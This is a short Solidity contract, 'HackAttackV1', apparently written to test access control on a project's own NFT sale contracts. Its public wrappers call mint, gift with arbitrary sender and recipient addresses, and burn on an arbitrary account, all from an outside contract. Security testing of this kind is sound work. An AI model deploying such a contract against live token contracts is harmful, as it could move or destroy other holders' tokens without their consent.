// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import "./CellarNftSale.sol";
import "./CellarNft1155Sale.sol";

contract HackAttackV1 {
    address private erc1155SaleAddr;
    address private erc721SaleAddr;

    event receiveEvent(address indexed sender,uint256 indexed value );
    event fallbackEvent(address indexed sender,uint256 indexed value );


    constructor(address _erc1155Addr, address _erc721Addr) {
        erc1155SaleAddr = _erc1155Addr;
        erc721SaleAddr = _erc721Addr;
    }

    function MintERC1155(
        uint256 id,
        uint256 amount,
        string memory tokenURI
    ) public {
        CellarNft1155Sale erc1155Sale = CellarNft1155Sale(erc1155SaleAddr);
        erc1155Sale.mintItem(address(this), id, amount, tokenURI);
    }

    function MintERC721(uint256 tokenId, string memory tokenURI) public {
        CellarNftSale erc721Sale = CellarNftSale(erc721SaleAddr);

        erc721Sale.mintItem(address(this), tokenId, tokenURI);
    }

    function GiftERc1155(
        address from,
        address to,
        uint256 id,
        uint256 amount
    ) public {
        CellarNft1155Sale erc1155Sale = CellarNft1155Sale(erc1155SaleAddr);
        erc1155Sale.gift(from, to, id, amount);
    }

    function GiftERC721(
        address from,
        address to,
        uint256 tokenId
    ) public {
        CellarNftSale erc721Sale = CellarNftSale(erc721SaleAddr);
        erc721Sale.gift(from, to, tokenId);
    }

    function BurnERC1155(
        address account,
        uint256 tokenId,
        uint256 amount)public {
            
            CellarNft1155Sale erc1155Sale = CellarNft1155Sale(erc1155SaleAddr);
            erc1155Sale.burn(account, tokenId, amount);
    }
    receive() external payable  {
       emit receiveEvent(msg.sender,msg.value);
    }
    
    fallback()external payable{
        emit fallbackEvent(msg.sender, msg.value);
    }
}
